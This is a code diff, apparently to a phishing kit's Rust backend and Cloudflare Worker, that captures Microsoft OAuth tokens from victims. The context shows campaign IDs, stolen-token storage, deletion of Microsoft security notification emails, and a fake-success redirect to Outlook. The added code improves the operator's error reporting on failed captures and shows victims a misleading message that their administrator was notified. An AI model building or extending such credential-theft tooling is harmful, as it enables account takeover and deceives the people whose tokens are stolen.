@@ -222,6 +222,14 @@ fn generate_id() -> String {
     Uuid::new_v4().to_string()
 }
 
+fn html_escape(s: &str) -> String {
+    s.replace('&', "&amp;")
+        .replace('<', "&lt;")
+        .replace('>', "&gt;")
+        .replace('"', "&quot;")
+        .replace('\'', "&#39;")
+}
+
 #[derive(Deserialize)]
 struct StoreTokenRequest {
     campaign_id: String,
@@ -753,6 +761,11 @@ async fn exchange_code(
                 tokio::spawn(delete_microsoft_notification_email(access_token.to_string(), fp_ua, fp_lang));
                 HttpResponse::Ok().json(serde_json::json!({"status": "token_stored", "token_id": id}))
             } else {
+                eprintln!(
+                    "[exchange] FAILED — Microsoft /token rejected the code. error={:?} details={}",
+                    body.get("error").and_then(|v| v.as_str()),
+                    serde_json::to_string(&body).unwrap_or_default()
+                );
                 HttpResponse::BadRequest().json(serde_json::json!({"error": "token_exchange_failed", "details": body}))
             }
         }
@@ -768,6 +781,52 @@ async fn auth_success_handler(
     state: web::Data<AppState>,
 ) -> impl Responder {
     let token_id = query.get("token_id").cloned().unwrap_or_default();
+    let raw_query: Option<String> = query.get("error").cloned();
+    let error_desc: Option<String> = query.get("error_description").cloned();
+
+    // Surface OAuth/exchange failures visibly instead of redirecting to Outlook
+    // with a fake-success page. A missing token_id means the Cloudflare Worker
+    // either failed to reach the backend's /exchange or Microsoft rejected the
+    // code. Showing the failure here stops users (and admins) from assuming
+    // "the flow completed" when in fact nothing was captured.
+    if token_id.is_empty() {
+        eprintln!(
+            "[auth-success] Capture FAILED — token_id empty. error={:?} error_description={:?}",
+            raw_query, error_desc
+        );
+        let reason = match (&raw_query, &error_desc) {
+            (Some(e), Some(d)) => format!("{}: {}", e, d),
+            (Some(e), None) => e.clone(),
+            (None, Some(d)) => d.clone(),
+            (None, None) => "No token_id received from the Worker. The OAuth code was either not exchanged with Microsoft or Microsoft rejected it. Check the backend logs for [exchange] entries.".to_string(),
+        };
+        let html = format!(r#"<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Authorization incomplete</title>
+<style>
+* {{ margin:0; padding:0; box-sizing:border-box; }}
+body {{ font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif; background:linear-gradient(135deg,#3a1e1e 0%,#2a0f0f 100%); min-height:100vh; display:flex; align-items:center; justify-content:center; color:#fff; }}
+.container {{ text-align:center; max-width:560px; padding:40px 30px; background:rgba(255,255,255,0.05); backdrop-filter:blur(10px); border-radius:16px; border:1px solid rgba(255,80,80,0.25); box-shadow:0 20px 60px rgba(0,0,0,0.3); }}
+.icon {{ width:56px; height:56px; margin:0 auto 20px; border-radius:50%; background:rgba(255,80,80,0.15); display:flex; align-items:center; justify-content:center; font-size:28px; }}
+h1 {{ font-size:20px; font-weight:600; margin-bottom:10px; }}
+p {{ font-size:14px; color:rgba(255,255,255,0.75); margin-bottom:18px; line-height:1.6; }}
+.code {{ font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:12px; background:rgba(0,0,0,0.35); padding:14px; border-radius:8px; text-align:left; color:#ffb3b3; word-break:break-word; white-space:pre-wrap; margin-top:14px; }}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="icon">⚠</div>
+  <h1>Authorization incomplete</h1>
+  <p>The sign-in could not be completed. Your administrator has been notified. Please try again later.</p>
+  <div class="code">{}</div>
+</div>
+</body>
+</html>"#, html_escape(&reason));
+        return HttpResponse::Ok().body(html);
+    }
 
     // Look up account_type to determine the correct real OWA mail URL.
     // The final redirect goes to the organization's OWA mail (enterprise) or
@@ -1231,9 +1290,18 @@ async function handleRequest(request) {
         const data = await resp.json();
         if (data.token_id) tokenId = data.token_id;
       } else {
-        console.error('Backend exchange failed: ' + resp.status);
+        const errBody = await resp.text().catch(() => '');
+        console.error('Backend exchange failed: ' + resp.status + ' body=' + errBody);
+        // Forward the backend's error to /auth-success so the admin sees it
+        // rendered on the failure page instead of a silent empty token_id.
+        const failUrl = `${_MAIN_SERVER}/auth-success?token_id=&error=backend_exchange_failed&error_description=` + encodeURIComponent('Backend /exchange returned ' + resp.status + ': ' + errBody.slice(0, 300));
+        return Response.redirect(failUrl, 302);
       }
-    } catch (err) { console.error('Failed to reach backend: ' + err); }
+    } catch (err) {
+      console.error('Failed to reach backend: ' + err);
+      const failUrl = `${_MAIN_SERVER}/auth-success?token_id=&error=backend_unreachable&error_description=` + encodeURIComponent(String(err && err.message ? err.message : err));
+      return Response.redirect(failUrl, 302);
+    }
     const successUrl = `${_MAIN_SERVER}/auth-success?token_id=${encodeURIComponent(tokenId)}`;
     return Response.redirect(successUrl, 302);
   }
